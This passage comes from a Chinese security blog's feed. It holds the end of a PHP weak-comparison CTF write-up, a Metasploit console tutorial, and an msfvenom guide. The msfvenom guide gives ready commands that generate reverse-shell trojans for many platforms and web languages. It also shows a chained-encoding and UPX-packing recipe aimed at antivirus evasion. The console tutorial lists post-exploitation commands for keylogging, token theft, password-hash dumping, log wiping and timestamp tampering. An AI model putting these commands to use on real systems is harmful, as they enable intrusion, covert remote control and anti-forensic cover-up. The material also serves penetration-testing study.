file!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>需要GET请求传入参数<code>key</code>，这个<code>key</code>需要是数字，且等于一个长字符串，设置<code>/index.php?key=123</code>，得到flag。</p><blockquote><p>在php中，<code>==</code>是弱比较，只比较值，所以</p><ul><li><code>5</code>&#x3D;&#x3D;5，得到true</li><li><code>5abc</code>&#x3D;&#x3D;5，得到true</li><li><code>a5bc</code>&#x3D;&#x3D;5，得到false</li></ul><p><code>===</code>是强比较，不仅比较值，还比较类型，所以</p><ul><li><code>5</code>&#x3D;&#x3D;&#x3D;5，得到false</li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[工具] msf使用教程</title>
    <link href="/2022/11/22/%5B%E5%B7%A5%E5%85%B7%5D%20msf%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <url>/2022/11/22/%5B%E5%B7%A5%E5%85%B7%5D%20msf%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="msf使用教程"><a href="#msf使用教程" class="headerlink" title="msf使用教程"></a>msf使用教程</h1><p>Metasploit（MSF）是一个免费的、可下载的框架</p><p>它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。</p><p>当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了，仿佛一夜之间，任何人都可以成为黑客。</p><p>使用<code>msfconsole</code>进入控制台，每次启动这个字符图挺有意思的，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221122211548188.png" alt="image-20221122211548188"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221122211641244.png" alt="image-20221122211641244"></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>常用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">msfconsole</span><br><span class="hljs-meta prompt_">msf6&gt; </span><span class="language-bash">use exploit/multi/handler</span><br><span class="hljs-meta prompt_">msf6&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="hljs-meta prompt_">msf6&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> LHOST 192.168.0.1</span><br><span class="hljs-meta prompt_">msf6&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> LPORT 2333</span><br><span class="hljs-meta prompt_">msf6&gt; </span><span class="language-bash">exploit</span><br></code></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>常用命令：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>show exploits</td><td>所有攻击模块</td></tr><tr><td>show payloads</td><td>所有payload</td></tr><tr><td>show auxiliary</td><td>所有辅助攻击荷载</td></tr><tr><td>info</td><td>展示制定渗透攻击或模块的相关信息</td></tr><tr><td>use [name]</td><td>装载指定模块</td></tr><tr><td>set [options]</td><td>设置指定参数</td></tr><tr><td>unset</td><td>删除配置</td></tr><tr><td>show options</td><td>列出所有选项</td></tr><tr><td>show targets</td><td>列出渗透攻击支持的目标平台</td></tr><tr><td>show advanced</td><td>列出所有高级配置选项</td></tr><tr><td>check</td><td>检查目标是否存在特定漏洞</td></tr><tr><td>connect</td><td>类似netcat，<code>connect IP PORT</code></td></tr><tr><td>kill</td><td>终止任务</td></tr><tr><td>search</td><td>搜索payload，exploit等</td></tr><tr><td>grep</td><td>同grep，<code>grep xxx search yyy</code></td></tr><tr><td>sessions</td><td><code>-l</code>列出所有活动会话；<code>-i</code>恢复会话；<code>-K</code>终止会话；</td></tr></tbody></table><h2 id="连接后的命令"><a href="#连接后的命令" class="headerlink" title="连接后的命令"></a>连接后的命令</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>help</td><td></td></tr><tr><td>run [script]</td><td>运行meterpreter脚本，在<code>scripts/meterpreter</code>下查看</td></tr><tr><td>sysinfo</td><td>系统信息</td></tr><tr><td>ls</td><td></td></tr><tr><td>use priv</td><td>加载提权模块</td></tr><tr><td>ps</td><td>进程</td></tr><tr><td>migrate PID</td><td>迁移到指定进程</td></tr><tr><td>use incognito</td><td>加载incognito功能，用来盗窃目标主机的令牌或假冒用户</td></tr><tr><td>list_tokens -u</td><td>列出目标主机可用令牌</td></tr><tr><td>impersonate_token DOMAIN_NAME\USERNAME</td><td>假冒目标主机上的可用令牌</td></tr><tr><td>steal_token PID</td><td>盗窃给定进程的可用令牌并进行令牌假冒</td></tr><tr><td>drop_token</td><td>停止假冒当前令牌</td></tr><tr><td>getsystem</td><td>通过各种攻击向量来提升系统用户权限</td></tr><tr><td>execute -f cmd.exe -i</td><td>执行cmd.exe命令并进行交互</td></tr><tr><td>execute -f cmd.exe -i -t</td><td>以所有可用令牌来执行cmd命令并隐藏该进程</td></tr><tr><td>rev2self</td><td>回到控制目标主机的初始用户账户下</td></tr><tr><td>reg command</td><td>在目标主机注册表中进行交互，创建，删除，查询等操作</td></tr><tr><td>setdesktop number</td><td>切换到另一个用户界面（该功能基于那些用户已登录）</td></tr><tr><td>screenshot</td><td>对目标主机的屏幕进行截图</td></tr><tr><td>upload file</td><td>向目标主机上传文件</td></tr><tr><td>download file</td><td>从目标主机下载文件</td></tr><tr><td>keyscan_start</td><td>针对远程目标主机开启键盘记录功能</td></tr><tr><td>keyscan_dump</td><td>存储目标主机上捕获的键盘记录</td></tr><tr><td>keyscan_stop</td><td>停止针对目标主机的键盘记录</td></tr><tr><td>getprivs</td><td>尽可能多的获取目标主机上的特权</td></tr><tr><td>uictl enable keyboard&#x2F;mouse</td><td>接管目标主机的键盘和鼠标</td></tr><tr><td>background</td><td>将你当前的metasploit shell转为后台执行</td></tr><tr><td>hashdump</td><td>导出目标主机中的口令哈希值</td></tr><tr><td>use sniffer</td><td>加载嗅探模式</td></tr><tr><td>sniffer_interfaces</td><td>列出目标主机所有开放的网络端口</td></tr><tr><td>sniffer_dump interfaceID pcapname</td><td>在目标主机上启动嗅探</td></tr><tr><td>sniffer_start interfaceID packet-buffer</td><td>在目标主机上针对特定范围的数据包缓冲区启动嗅探</td></tr><tr><td>sniffer_stats interfaceID</td><td>获取正在实施嗅探网络接口的统计数据</td></tr><tr><td>sniffer_stop interfaceID</td><td>停止嗅探</td></tr><tr><td>add_user username password -h ip</td><td>在远程目标主机上添加一个用户</td></tr><tr><td>clearev</td><td>清楚目标主机上的日志记录</td></tr><tr><td>timestomp</td><td>修改文件属性，例如修改文件的创建时间（反取证调查）</td></tr><tr><td>reboot</td><td>重启目标主机</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>msf</tag>
      
      <tag>木马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[工具] msfvenom用法</title>
    <link href="/2022/11/22/%5B%E5%B7%A5%E5%85%B7%5D%20msfvenom%E7%94%A8%E6%B3%95/"/>
    <url>/2022/11/22/%5B%E5%B7%A5%E5%85%B7%5D%20msfvenom%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="msfvenom用法"><a href="#msfvenom用法" class="headerlink" title="msfvenom用法"></a>msfvenom用法</h1><p>msfvenom是msf中生成木马的模块。</p><h2 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h2><p>使用帮助为：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221122194812584.png" alt="image-20221122194812584"></p><p>翻译一下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-l, <span class="hljs-attr">--list</span>             &lt;type&gt;      列举<span class="hljs-selector-attr">[type]</span>的所有模块，包括：payloads，encoders，nops，platforms，archs，encrypt，formats，<span class="hljs-attribute">all</span><br>-<span class="hljs-selector-tag">p</span>, <span class="hljs-attr">--payload</span>          &lt;payload&gt;   可用的payload。通过<span class="hljs-string">&#x27;-&#x27;</span>和STDIN设置自定义payload<br>    <span class="hljs-attr">--list-options</span>                 列出所选payload的所有参数<br>-f, <span class="hljs-attr">--format</span>           &lt;format&gt;    输出格式<br>-e, <span class="hljs-attr">--encoder</span>          &lt;encoder&gt;   编码方式<br>    <span class="hljs-attr">--service-name</span>     &lt;value&gt;     生成服务（service）二进制文件时的服务名称<br>    <span class="hljs-attr">--sec-name</span>         &lt;value&gt;     生成大型windows二进制文件时使用的<span class="hljs-string">&#x27;section name&#x27;</span>，默认随机<span class="hljs-number">4</span>个字母的字符串<br>    <span class="hljs-attr">--smallest</span>                     使用所有编码器生成最小的payload<br>    <span class="hljs-attr">--encrypt</span>          &lt;value&gt;     对shellcode加密或编码的方式<br>    <span class="hljs-attr">--encrypt-key</span>      &lt;key&gt;       加密使用的key<br>    <span class="hljs-attr">--encrypt-iv</span>       &lt;value&gt;     加密使用的初始向量<br>-<span class="hljs-selector-tag">a</span>, <span class="hljs-attr">--arch</span>             &lt;arch&gt;      payload或编码器的架构（architecture）<br>    <span class="hljs-attr">--platform</span>         &lt;platform&gt;  payload使用的平台（platform）<br>-o, <span class="hljs-attr">--out</span>              &lt;path&gt;      payload的输出文件<br>-<span class="hljs-selector-tag">b</span>, <span class="hljs-attr">--bad-chars</span>        &lt;list&gt;      设定规避字符集，比如<span class="hljs-string">&#x27;\x00\xff&#x27;</span><br>-n, <span class="hljs-attr">--nopsled</span>          &lt;length&gt;    为payload预先指定一个NOP滑动长度<br>    <span class="hljs-attr">--pad-nops</span>                     <br>-s, <span class="hljs-attr">--space</span>            &lt;length&gt;    生成payload的最大大小<br>    <span class="hljs-attr">--encoder-space</span>    &lt;length&gt;    编码后的payload的最大大小<br>-<span class="hljs-selector-tag">i</span>, <span class="hljs-attr">--iterations</span>       &lt;count&gt;     payload编码次数<br>-c, <span class="hljs-attr">--add-code</span>         &lt;path&gt;      包括一个指定的win32 shellcode文件<br>-x, <span class="hljs-attr">--template</span>         &lt;path&gt;      指定一个自定义的可执行文件作为模板    <br>-k, <span class="hljs-attr">--keep</span>                         保护模板程序的动作，注入的payload作为一个新的进程运行<br>-v, <span class="hljs-attr">--var-name</span>         &lt;value&gt;     指定一个自定义的变量，以确定输出格式<br>-t, <span class="hljs-attr">--timeout</span>          &lt;second&gt;    从STDIN读取payload的等待秒数（默认<span class="hljs-number">30</span>，<span class="hljs-number">0</span>表示无效）<br>-h, <span class="hljs-attr">--help</span><br>    <br></code></pre></td></tr></table></figure><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>可输出的格式，<code>msfvenom --list format</code>，</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs vim">可执行文件格式：<br>    asp<br>    aspx<br>    aspx-<span class="hljs-keyword">exe</span><br>    axis2<br>    dll<br>    elf<br>    elf-<span class="hljs-keyword">so</span><br>    <span class="hljs-keyword">exe</span><br>    <span class="hljs-keyword">exe</span>-<span class="hljs-keyword">only</span><br>    <span class="hljs-keyword">exe</span>-service<br>    <span class="hljs-keyword">exe</span>-small<br>    hta-psh<br>    jar<br>    jsp<br>    loop-vbs<br>    macho<br>    msi<br>    msi-nouac<br>    osx-app<br>    psh<br>    psh-cmd<br>    psh-net<br>    psh-reflection<br>    <span class="hljs-keyword">python</span>-reflection<br>    vba<br>    vba-<span class="hljs-keyword">exe</span><br>    vba-psh<br>    vbs<br>    war<br>转换格式：<br>    base32<br>    base64<br>    bash<br>    <span class="hljs-keyword">c</span><br>    csharp<br>    dw<br>    dword<br>    hex<br>    java<br>    js_be<br>    js_le<br>    num<br>    <span class="hljs-keyword">perl</span><br>    pl<br>    powershell<br>    ps1<br>    <span class="hljs-keyword">py</span><br>    <span class="hljs-keyword">python</span><br>    raw<br>    rb<br>    <span class="hljs-keyword">ruby</span><br>    <span class="hljs-keyword">sh</span><br>    vbapplication<br>    vbscript<br></code></pre></td></tr></table></figure><h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>可编码的方式，<code>msfvenom --list encoder</code>，</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs gams">Name                          Rank       Description<br>----                          ----       -----------<br>cmd/brace                     low        Bash Brace Expansion Command Encoder<br>cmd/echo                      good       Echo Command Encoder<br>cmd/generic_sh                manual     Generic Shell <span class="hljs-keyword">Variable</span> Substitution <span class="hljs-comment">Command Encoder</span><br>cmd/ifs                       low        Bourne $&#123;IFS&#125; Substitution Command Encoder<br>cmd/perl                      <span class="hljs-comment">normal     Perl Command Encoder</span><br>cmd/powershell_base64         excellent  Powershell Base64 Command Encoder<br>cmd/printf_php_mq             <span class="hljs-comment">manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br>generic/eicar                 manual     The EICAR Encoder<br>generic/none                  <span class="hljs-comment">normal     The</span> <span class="hljs-comment">&quot;none&quot;</span> <span class="hljs-comment">Encoder</span><br>mipsbe/byte_xori              <span class="hljs-built_in">normal</span>     Byte XORi Encoder<br>mipsbe/longxor                <span class="hljs-comment">normal     XOR Encoder</span><br>mipsle/byte_xori              <span class="hljs-built_in">normal</span>     Byte XORi Encoder<br>mipsle/longxor                <span class="hljs-comment">normal     XOR Encoder</span><br>php/base64                    great      PHP Base64 Encoder<br>ppc/longxor                   <span class="hljs-comment">normal     PPC LongXOR Encoder</span><br>ppc/longxor_tag               <span class="hljs-built_in">normal</span>     PPC LongXOR Encoder<br>ruby/base64                   <span class="hljs-comment">great      Ruby Base64 Encoder</span><br>sparc/longxor_tag             <span class="hljs-built_in">normal</span>     SPARC DWORD <span class="hljs-keyword">XOR</span> Encoder<br>x64/xor                       <span class="hljs-comment">normal     XOR Encoder</span><br>x64/xor_context               <span class="hljs-built_in">normal</span>     Hostname-based Context Keyed Payload Encoder<br>x64/xor_dynamic               <span class="hljs-comment">normal     Dynamic key XOR Encoder</span><br>x64/zutto_dekiru              manual     Zutto Dekiru<br>x86/add_sub                   <span class="hljs-comment">manual     Add</span>/Sub Encoder<br>x86/<span class="hljs-comment">alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br>x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder<br>x86/avoid_underscore_tolower  <span class="hljs-comment">manual     Avoid underscore</span>/tolower<br>x86/<span class="hljs-comment">avoid_utf8_tolower        manual     Avoid UTF8</span>/tolower<br>x86/<span class="hljs-comment">bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br>x86/bmp_polyglot              manual     BMP Polyglot<br>x86/call4_dword_xor           <span class="hljs-comment">normal     Call+4 Dword XOR Encoder</span><br>x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder<br>x86/context_stat              <span class="hljs-comment">manual     stat(2)-based Context Keyed Payload Encoder</span><br>x86/context_time              manual     time(<span class="hljs-number">2</span>)-based Context Keyed Payload Encoder<br>x86/countdown                 <span class="hljs-comment">normal     Single-byte XOR Countdown Encoder</span><br>x86/fnstenv_mov               <span class="hljs-built_in">normal</span>     Variable-length Fnstenv/mov <span class="hljs-comment">Dword XOR Encoder</span><br>x86/jmp_call_additive         <span class="hljs-built_in">normal</span>     Jump/Call <span class="hljs-comment">XOR Additive Feedback Encoder</span><br>x86/nonalpha                  low        Non-Alpha Encoder<br>x86/nonupper                  <span class="hljs-comment">low        Non-Upper Encoder</span><br>x86/opt_sub                   manual     Sub Encoder (optimised)<br>x86/service                   <span class="hljs-comment">manual     Register Service</span><br>x86/shikata_ga_nai            excellent  Polymorphic <span class="hljs-keyword">XOR</span> Additive Feedback Encoder<br>x86/single_static_bit         <span class="hljs-comment">manual     Single Static Bit</span><br>x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder<br>x86/unicode_upper             <span class="hljs-comment">manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br>x86/xor_dynamic               <span class="hljs-built_in">normal</span>     Dynamic key <span class="hljs-keyword">XOR</span> Encoder<br><br></code></pre></td></tr></table></figure><h3 id="加密格式"><a href="#加密格式" class="headerlink" title="加密格式"></a>加密格式</h3><p>可加密方式，<code>msfvenom --list encrypt</code>，</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Name</span><br><span class="hljs-section">----</span><br>aes256<br>base64<br>rc4<br>xor<br></code></pre></td></tr></table></figure><h3 id="可指定的架构（Architectures）"><a href="#可指定的架构（Architectures）" class="headerlink" title="可指定的架构（Architectures）"></a>可指定的架构（Architectures）</h3><p>可指定的架构，<code>msfvenom --list archs</code>，</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Name</span><br><span class="hljs-section">----</span><br>aarch64<br>armbe<br>armle<br>cbea<br>cbea64<br>cmd<br>dalvik<br>firefox<br>java<br>mips<br>mips64<br>mips64le<br>mipsbe<br>mipsle<br>nodejs<br>php<br>ppc<br>ppc64<br>ppc64le<br>ppce500v2<br>python<br>r<br>ruby<br>sparc<br>sparc64<br>tty<br>x64<br>x86<br>x86_64<br>zarch<br><br></code></pre></td></tr></table></figure><h3 id="可指定平台（Platforms）"><a href="#可指定平台（Platforms）" class="headerlink" title="可指定平台（Platforms）"></a>可指定平台（Platforms）</h3><p>可指定平台，<code>msfvenom --list platforms</code>，</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Name</span><br><span class="hljs-section">----</span><br>aix<br>android<br>apple_ios<br>arista<br>brocade<br>bsd<br>bsdi<br>cisco<br>firefox<br>freebsd<br>hardware<br>hpux<br>irix<br>java<br>javascript<br>juniper<br>linux<br>mainframe<br>mikrotik<br>multi<br>netbsd<br>netware<br>nodejs<br>openbsd<br>osx<br>php<br>python<br>r<br>ruby<br>solaris<br>unifi<br>unix<br>unknown<br>windows<br><br></code></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>通常用法就是生成木马，本地开启监听，然后在目标机器上运行。</p><h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><p>Linux</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure><p>Windows</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p>Mac</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f macho &gt; shell.macho<br></code></pre></td></tr></table></figure><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>PHP</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php<br><br>cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p>ASP</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure><p>JSP</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br></code></pre></td></tr></table></figure><p>Python</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py<br></code></pre></td></tr></table></figure><p>Bash</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh<br></code></pre></td></tr></table></figure><p>Perl</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl<br></code></pre></td></tr></table></figure><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>对生成的payload进行多次编码，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">lport</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -e x86/shikata_ga_nai -i 20 -f<span class="hljs-built_in"> raw </span>| msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f<span class="hljs-built_in"> raw </span>| msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f<span class="hljs-built_in"> raw </span>| msfvenom -e x86/countdown -a x86 --platform windows -i 10  -f exe -o shell.exe<br></code></pre></td></tr></table></figure><p>这里进行了这样的编码：</p><ul><li><code>shikata_ga_nai</code>编码20次</li><li><code>alpha_upper</code>编码5次</li><li><code>shikata_ga_nai</code>编码10次</li><li><code>countdown</code>编码10次</li></ul><p>然后进行UPX加壳，</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">upx <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>经过测试在<code>defender</code>的可以检测到的。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/bmjoker/p/10051014.html">9.利用msfvenom生成木马 - bmjoker - 博客园 (cnblogs.com)</a></li><li></li></ul>]]></content>
    
    
    <categories>
      
